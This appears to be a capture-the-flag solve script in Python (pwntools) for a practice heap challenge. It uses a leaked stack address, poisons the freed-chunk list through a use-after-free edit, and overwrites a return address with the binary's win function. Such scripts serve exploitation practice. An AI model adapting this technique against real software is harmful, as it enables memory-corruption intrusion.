from pwn import *

context.binary = elf = ELF('../challenge/chal_patched')

# r = elf.process()
# assert r
r = remote("0.0.0.0", 1335)

def malloc(index, size):
    r.send(b'1\n')
    r.send(str(index).encode() + b'\n')
    r.send(str(size).encode() + b'\n')

def free(index):
    r.send(b'3\n')
    r.send(str(index).encode() + b'\n')

def puts(index):
    r.send(b'4\n')
    r.send(str(index).encode() + b'\n')


def quit():
    r.send(b'5\n')
    

r.recvuntil(b'hidden at: ')
stack_leak = r.recvline().split(b'\n')[0]
stack_leak = int(stack_leak, 16)
ret_adr = stack_leak + 0x68

malloc(1, 16)
malloc(2, 16)
free(1)
free(2)
r.clean()

r.send(b'2\n')
r.send(b'2\n')
r.send(p64(ret_adr) + b'\n')

malloc(1, 16)
malloc(2, 16)
r.send(b'2\n')
r.send(b'2\n')
r.send(p64(elf.sym['win']) + b'\n')


quit()


# gdb.attach(r)
# r.send('1\n')
r.interactive()
